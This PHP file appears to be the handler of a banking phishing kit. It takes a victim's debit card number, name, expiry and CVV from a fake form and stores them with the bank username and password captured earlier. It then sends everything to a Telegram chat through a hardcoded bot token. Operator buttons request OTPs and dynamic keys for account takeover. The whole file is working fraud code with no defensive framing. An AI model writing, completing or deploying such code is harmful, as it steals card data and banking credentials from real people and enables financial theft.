<?php
/**
 * enviar_dato_extra1.php
 * ----------------------
 * Handler POST de la pantalla de TARJETA DÉBITO (opcion6.html).
 * El usuario rellenó número de tarjeta, nombre, fecha y CVV.
 *
 * Aplica los 7 pasos standard de enviar_dato_extra* (ver docblock de
 * enviar_dato_extra.php para la lista completa de pasos).
 *   • Paso 4: guarda tarjeta (numero_tarjeta / nombre_tarjeta /
 *             vencimiento_tar / cvv) en la fila de `solicitudes`.
 *   • Teclado inline standard con OPCION_9=ERROR Dinámica, OPCION_10=FINALIZAR.
 */

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1 ────────────────────────────────────────────────────────────────────
$tarjeta = $_POST['tarjeta'] ?? $_POST['codigo'] ?? '';
$nombre  = $_POST['nombre']  ?? '';
$fecha   = $_POST['fecha']   ?? '';
$cvv     = $_POST['cvv']     ?? '';
$key     = $_POST['key']     ?? '';
if (!$key) {
    die("Error: Key no proporcionada.");
}

// ── Paso 2 ────────────────────────────────────────────────────────────────────
$stmt = $pdo->prepare(
    "SELECT numero_cuenta, monto, banco, nombre AS nombre_prev, telefono, correo
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$celular   = $data['numero_cuenta'];
$monto     = $data['monto'];
$banco     = $data['banco'];
$usuario   = $data['nombre_prev'];
$clave     = $data['telefono'];
$correo    = $data['correo'];

// ── Paso 3 ────────────────────────────────────────────────────────────────────
try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Paso 4 ────────────────────────────────────────────────────────────────────
$update = $pdo->prepare(
    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
);
$update->execute([$nuevo_request_id, $key]);

$saveCard = $pdo->prepare(
    "UPDATE solicitudes
     SET numero_tarjeta = ?, nombre_tarjeta = ?, vencimiento_tar = ?, cvv = ?
     WHERE BINARY `key` = ?"
);
$saveCard->execute([$tarjeta, $nombre, $fecha, $cvv, $key]);

// ── Paso 5 ────────────────────────────────────────────────────────────────────
// Configuración OPERACIONES: 1) env vars Render (nuevo) 2) fallback hardcode (legacy).
$FALLBACK_BOT_TOKEN_OPS = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$FALLBACK_CHAT_ID_OPS   = "-4923753161";
$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;

$mensaje  = "✅ <b>[DATO EXTRA: TARJETA DÉBITO COMPLETA]</b> Número + nombre + venc + CVV:\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💸 Recarga solicitada: $monto\n";
$mensaje .= "🏦 Banco elegido: $banco\n";
$mensaje .= "📧 Email: $correo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "Usuario: $usuario\n";
$mensaje .= "Contraseña: $clave\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💳 Tarjeta: $tarjeta\n";
$mensaje .= "👤 Nombre en tarjeta: $nombre\n";
$mensaje .= "📅 Vencimiento: $fecha\n";
$mensaje .= "🔒 CVV: $cvv\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";

$botones = [
    'inline_keyboard' => [[
        ['text' => "clavedinamica",    'callback_data' => "OPCION_1_$nuevo_request_id"],
        ['text' => "otp",              'callback_data' => "OPCION_2_$nuevo_request_id"],
    ], [
        ['text' => "repetirusuario",   'callback_data' => "OPCION_3_$nuevo_request_id"],
        ['text' => "repetirdinamica",  'callback_data' => "OPCION_4_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR Dinámica", 'callback_data' => "OPCION_9_$nuevo_request_id"],
        ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$nuevo_request_id"],
    ]],
];

$payload = json_encode([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => $botones,
]);
$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Paso 6 y 7 ────────────────────────────────────────────────────────────────
header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
exit;
